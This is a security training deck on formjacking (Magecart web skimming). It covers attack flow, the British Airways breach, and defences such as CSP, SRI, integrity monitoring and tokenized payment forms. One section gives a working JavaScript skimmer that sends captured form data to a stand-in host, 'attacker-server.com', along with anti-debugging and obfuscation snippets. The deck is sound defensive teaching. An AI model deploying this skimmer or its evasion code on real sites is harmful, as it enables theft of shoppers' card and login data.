# Formjacking
---
## What is Formjacking?

- Formjacking, also known as Web Form Skimming or Digital Skimming, is a type of cyber attack where malicious code is injected into the payment forms of legitimate websites to steal sensitive information
- The digital equivalent of a card skimmer on an ATM machine
- Targets credit card details, personal data, and login credentials
- Extremely difficult for end users to detect -- the website looks and functions normally
- Symantec blocked over 3.7 million formjacking attempts in a single year (2018)

---
## How Does Formjacking Work

```text
┌──────────────────────────────────────────────────────────┐
│          Formjacking Attack Flow                          │
│                                                          │
│  1. Attacker compromises website or third-party script   │
│                                                          │
│  2. Malicious JavaScript injected into payment page      │
│                                                          │
│  ┌──────────────┐     ┌──────────────┐                   │
│  │   Customer    │     │  Compromised │                   │
│  │   Browser     │────>│  E-Commerce  │                   │
│  │              │     │  Website     │                   │
│  │  Enters card │     │              │                   │
│  │  details     │     │  Skimmer JS  │                   │
│  └──────┬───────┘     └──────┬───────┘                   │
│         │                     │                           │
│         │    Card data        │   Card data               │
│         │    (normal flow)    │   (stolen copy)           │
│         v                     v                           │
│  ┌──────────────┐     ┌──────────────┐                   │
│  │   Payment    │     │  Attacker's  │                   │
│  │   Processor  │     │  Server      │                   │
│  │   (Stripe)   │     │  (exfil.cc)  │                   │
│  └──────────────┘     └──────────────┘                   │
│                                                          │
│  3. Transaction completes normally (victim unaware)      │
│  4. Attacker collects stolen card data                   │
└──────────────────────────────────────────────────────────┘
```

---
## Attack Vectors

| Vector                        | Description                                    | Prevalence |
|-------------------------------|------------------------------------------------|------------|
| Direct website compromise     | Attacker gains access to web server            | Common     |
| Third-party script compromise | Inject via analytics, chat, or ad scripts      | Very common|
| Supply chain attack           | Compromise an npm/CDN dependency               | Growing    |
| Magento/CMS vulnerabilities   | Exploit known CMS security flaws               | Common     |
| Compromised admin credentials | Access CMS admin panel, inject code            | Common     |
| CDN/hosting compromise        | Modify scripts served from CDN                 | Rare       |

---
## Magecart Groups

- "Magecart" is an umbrella term for cybercriminal groups specializing in formjacking
- Named after the Magento e-commerce platform they initially targeted
- At least 12 distinct groups identified by researchers

| Group       | Notable Targets                          | Technique                    |
|-------------|------------------------------------------|------------------------------|
| Magecart 1  | Magento stores                           | Direct server compromise     |
| Magecart 3  | Feedify (cloud widget)                   | Supply chain attack          |
| Magecart 5  | Ticketmaster (via Inbenta)               | Third-party script injection |
| Magecart 6  | British Airways, Newegg                  | Custom targeted skimmers     |
| Magecart 9  | Various e-commerce                       | Obfuscated JS injection      |
| Magecart 12 | OpenCart, Magento stores                 | Google Analytics mimicry     |

---
## British Airways Attack (2018)

```text
┌──────────────────────────────────────────────────────────┐
│          British Airways Magecart Attack                  │
│                                                          │
│  Timeline:                                               │
│  - Aug 21 - Sep 5, 2018 (15 days undetected)            │
│  - ~380,000 payment cards stolen                         │
│  - BA fined 20 million GBP by ICO (GDPR)                │
│                                                          │
│  Attack method:                                          │
│  - 22 lines of JavaScript injected into BA website       │
│  - Targeted the payment form specifically                │
│  - Data exfiltrated to baways.com (typosquat domain)     │
│  - Attackers had valid SSL certificate for exfil domain  │
│                                                          │
│  Key lesson:                                             │
│  - Extremely targeted, minimal code                      │
│  - Custom-built for the specific payment form            │
│  - SSL on exfil domain avoided browser warnings          │
└──────────────────────────────────────────────────────────┘
```

---
## JavaScript Skimmer Code Analysis

### Simple Skimmer Example (Educational)

```javascript
// WARNING: This is a simplified example for educational purposes only

// Typical skimmer attaches to form submission events
document.addEventListener('submit', function(event) {
    var form = event.target;
    var formData = {};

    // Collect all input field values
    var inputs = form.querySelectorAll('input, select');
    inputs.forEach(function(input) {
        if (input.name && input.value) {
            formData[input.name] = input.value;
        }
    });

    // Exfiltrate data to attacker's server
    var img = new Image();
    img.src = 'https://attacker-server.com/collect?data=' +
              btoa(JSON.stringify(formData));
    // Using an Image() request avoids CORS restrictions
    // Base64 encoding hides the data in transit
});
```

---
## Advanced Skimmer Techniques

```c
┌──────────────────────────────────────────────────────────┐
│          Skimmer Evasion Techniques                       │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  Obfuscation:                                            │
│  - String encoding (base64, hex, charCode)               │
│  - Variable name randomization                           │
│  - Code splitting across multiple files                  │
│  - Steganography (hide JS in image files)                │
│                                                          │
│  Anti-Detection:                                         │
│  - Only activate on checkout/payment pages               │
│  - Check for developer tools (debugger detection)        │
│  - Avoid running in sandboxed/analysis environments      │
│  - Delay execution to avoid automated scanning           │
│  - Only skim on specific browsers/geolocations           │
│                                                          │
│  Exfiltration:                                           │
│  - Image pixel requests (bypasses CORS)                  │
│  - WebSocket connections                                 │
│  - Disguised as analytics/tracking requests              │
│  - Encrypted payloads to blend with HTTPS traffic        │
│  - Store data in localStorage, exfil later               │
└──────────────────────────────────────────────────────────┘
```

```javascript
// Example: Obfuscated exfiltration disguised as analytics
var _0x4a2b = ['\x67\x65\x74','\x73\x65\x6e\x64'];
// Decoded: ['get','send']

// Anti-debugging check
setInterval(function() {
    var start = performance.now();
    debugger;  // Pauses if DevTools is open
    if (performance.now() - start > 100) {
        // Developer tools detected, stop skimming
        return;
    }
}, 1000);
```

---
## Content Security Policy (CSP) as Defense

```text
┌──────────────────────────────────────────────────────────┐
│          CSP Defense Against Formjacking                  │
│                                                          │
│  Without CSP:                                            │
│  Any script can run, any destination can be contacted    │
│                                                          │
│  With CSP:                                               │
│  Only approved scripts run, only approved destinations   │
│  can receive data                                        │
└──────────────────────────────────────────────────────────┘
```

```text
# HTTP Header: Content-Security-Policy
Content-Security-Policy:
    default-src 'self';
    script-src 'self' https://js.stripe.com;
    connect-src 'self' https://api.stripe.com;
    img-src 'self' data:;
    style-src 'self' 'unsafe-inline';
    frame-src https://js.stripe.com;
    form-action 'self' https://api.stripe.com;
    report-uri /csp-report;
```

### Key CSP Directives for Formjacking Defense

| Directive      | Purpose                                      | Example Value              |
|----------------|----------------------------------------------|----------------------------|
| `script-src`   | Allowed JavaScript sources                   | `'self' https://cdn.com`   |
| `connect-src`  | Allowed AJAX/fetch/WebSocket destinations    | `'self' https://api.com`   |
| `form-action`  | Allowed form submission targets              | `'self'`                   |
| `img-src`      | Allowed image sources (blocks pixel exfil)   | `'self' data:`             |
| `report-uri`   | Where to send CSP violation reports          | `/csp-violations`          |

---
## Implementing CSP

```python
# Flask example: Adding CSP headers
from flask import Flask, make_response

app = Flask(__name__)

@app.after_request
def add_csp_header(response):
    csp = (
        "default-src 'self'; "
        "script-src 'self' https://js.stripe.com; "
        "connect-src 'self' https://api.stripe.com; "
        "img-src 'self' data:; "
        "style-src 'self'; "
        "form-action 'self'; "
        "frame-ancestors 'none'; "
        "report-uri /csp-report"
    )
    response.headers['Content-Security-Policy'] = csp
    return response

# Start with report-only mode to avoid breaking things
# Content-Security-Policy-Report-Only: <same policy>

@app.route('/csp-report', methods=['POST'])
def csp_report():
    """Collect CSP violation reports."""
    report = request.get_json(force=True)
    log_csp_violation(report)
    return '', 204
```

---
## Subresource Integrity (SRI)

```html
<!-- WITHOUT SRI: If CDN is compromised, malicious JS executes -->
<script src="https://cdn.example.com/jquery-3.6.0.min.js">
</script>

<!-- WITH SRI: Browser verifies hash before executing -->
<script
    src="https://cdn.example.com/jquery-3.6.0.min.js"
    integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfG"
    crossorigin="anonymous">
</script>
```

```python
┌──────────────────────────────────────────────────────────┐
│          How SRI Works                                    │
│                                                          │
│  1. Developer calculates hash of known-good script       │
│     $ shasum -b -a 384 jquery.min.js | base64            │
│                                                          │
│  2. Hash is included in the integrity attribute           │
│     integrity="sha384-<hash>"                            │
│                                                          │
│  3. Browser downloads the script from CDN                │
│                                                          │
│  4. Browser calculates hash of downloaded content        │
│                                                          │
│  5. If hashes match    -> script executes normally       │
│     If hashes differ   -> script is BLOCKED              │
│     (attacker modified -> blocked!)                      │
└──────────────────────────────────────────────────────────┘
```

```bash
# Generate SRI hash for a local file
cat jquery.min.js | openssl dgst -sha384 -binary | openssl base64 -A

# Or use the srihash.org website
# Or use npm: npx ssri integrity jquery.min.js
```

---
## Detection Methods

### Client-Side Detection

```javascript
// MutationObserver: Watch for unexpected DOM changes
const observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        mutation.addedNodes.forEach(function(node) {
            if (node.tagName === 'SCRIPT') {
                // Alert on unexpected script injection
                console.warn('New script detected:', node.src);
                reportSuspiciousScript(node);
            }
        });
    });
});

observer.observe(document.documentElement, {
    childList: true,
    subtree: true
});
```

### Server-Side Detection

```bash
# File integrity monitoring (detect modified files)
# Using AIDE (Advanced Intrusion Detection Environment)
sudo aide --init
sudo aide --check

# Compare current JS files against known-good hashes
find /var/www/html -name "*.js" -exec sha256sum {} \; > current.txt
diff known_good_hashes.txt current.txt
```

---
## Detection Tools and Services

| Tool / Service        | Type             | Capability                          |
|-----------------------|------------------|-------------------------------------|
| CSP Reporting         | Built-in browser | Detect unauthorized script sources  |
| AIDE / OSSEC          | Server-side      | File integrity monitoring           |
| MutationObserver API  | Client-side      | Detect DOM manipulation             |
| Jscrambler            | Commercial       | Real-time webpage integrity         |
| PerimeterX            | Commercial       | Bot and skimmer detection           |
| Source Defense        | Commercial       | Client-side protection platform     |
| Report URI            | SaaS             | CSP violation monitoring            |

---
## PCI DSS Requirements for Formjacking

```text
┌──────────────────────────────────────────────────────────┐
│  PCI DSS 4.0 Requirements (effective March 2025)         │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  Requirement 6.4.3:                                      │
│  All payment page scripts must be:                       │
│  - Inventoried and authorized                            │
│  - Integrity verified (SRI or equivalent)                │
│  - Script behavior documented and justified              │
│                                                          │
│  Requirement 11.6.1:                                     │
│  Implement a change/tamper detection mechanism for:      │
│  - HTTP headers (CSP, etc.)                              │
│  - Payment page script content                           │
│  - Must alert on unauthorized changes                    │
│                                                          │
│  These requirements make CSP and SRI effectively         │
│  mandatory for any site processing credit cards          │
└──────────────────────────────────────────────────────────┘
```

---
## Defense in Depth Strategy

```bash
┌──────────────────────────────────────────────────────────┐
│  Layer 1: Prevention                                     │
│  ├── Content Security Policy (strict script-src)         │
│  ├── Subresource Integrity (SRI) for all external JS     │
│  ├── Third-party script sandboxing (iframes)             │
│  └── Minimize third-party scripts                        │
│                                                          │
│  Layer 2: Detection                                      │
│  ├── CSP violation reporting and monitoring              │
│  ├── File integrity monitoring (AIDE, OSSEC)             │
│  ├── Web application firewall (WAF)                      │
│  └── Synthetic monitoring (automated checkout tests)     │
│                                                          │
│  Layer 3: Response                                       │
│  ├── Incident response plan specific to formjacking      │
│  ├── Rapid rollback capability                           │
│  ├── Customer notification procedures                    │
│  └── Forensic investigation process                      │
│                                                          │
│  Layer 4: Architecture                                   │
│  ├── Host payment forms in isolated iframe               │
│  ├── Use tokenized payment (Stripe Elements)             │
│  ├── Server-side payment processing when possible        │
│  └── Regular security audits and penetration testing     │
└──────────────────────────────────────────────────────────┘
```

---
## Best Practice: Tokenized Payment Forms

```html
<!-- VULNERABLE: Self-hosted payment form -->
<form action="/pay" method="POST">
    <input name="card_number" type="text">
    <input name="expiry" type="text">
    <input name="cvv" type="text">
    <button type="submit">Pay</button>
</form>
<!-- Skimmer can easily read these fields -->

<!-- SECURE: Stripe Elements (hosted iframe) -->
<div id="card-element"></div>
<script src="https://js.stripe.com/v3/"
    integrity="sha384-..."
    crossorigin="anonymous"></script>
<script>
    var stripe = Stripe('pk_live_xxx');
    var elements = stripe.elements();
    var card = elements.create('card');
    card.mount('#card-element');
    // Card details never touch your server or DOM
    // Skimmer cannot access iframe content (same-origin)
</script>
```

- Payment fields are in a cross-origin iframe controlled by Stripe
- Your JavaScript cannot read the iframe content (browser security)
- Skimmer code on your site cannot access the card data
- PCI DSS scope is dramatically reduced

---
## Key Takeaways

- Formjacking is one of the most profitable and stealthy web attacks
- Magecart groups have evolved sophisticated, targeted skimming techniques
- Third-party scripts are the most common attack vector -- minimize and control them
- CSP is the strongest browser-level defense: restrict script sources and data destinations
- SRI ensures external scripts have not been tampered with
- Tokenized payment forms (Stripe Elements, Braintree) are the best architectural defense
- PCI DSS 4.0 now requires script inventory, integrity checks, and tamper detection
- Defense in depth: combine CSP + SRI + monitoring + tokenized payments
